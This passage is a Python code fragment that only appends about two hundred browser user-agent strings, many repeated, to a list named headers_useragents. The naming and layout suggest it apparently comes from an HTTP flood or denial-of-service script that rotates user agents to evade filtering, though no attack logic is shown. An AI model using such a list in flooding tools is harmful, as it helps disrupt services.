                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
